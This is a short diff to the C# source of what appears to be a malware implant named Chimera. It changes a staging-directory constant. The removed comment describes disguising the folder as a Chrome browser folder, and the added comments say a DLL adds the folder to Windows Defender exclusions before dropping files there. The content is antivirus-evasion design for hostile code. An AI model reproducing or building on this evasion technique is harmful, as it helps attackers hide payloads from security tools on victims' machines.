@@ -4,10 +4,11 @@ using System.IO;
 namespace Chimera
 {
     // Central staging directory used by all commands that write artifacts to disk.
-    // Hidden folder that blends in as a browser folder.
+    // C:\Users\Public always exists on every Windows machine — no Chrome required.
+    // The DLL adds this directory to Defender exclusions before dropping files here.
     public static class Staging
     {
-        public const string Dir = @"C:\Users\Public\Chrome";
+        public const string Dir = @"C:\Users\Public";
 
         public static void EnsureDir()
         {
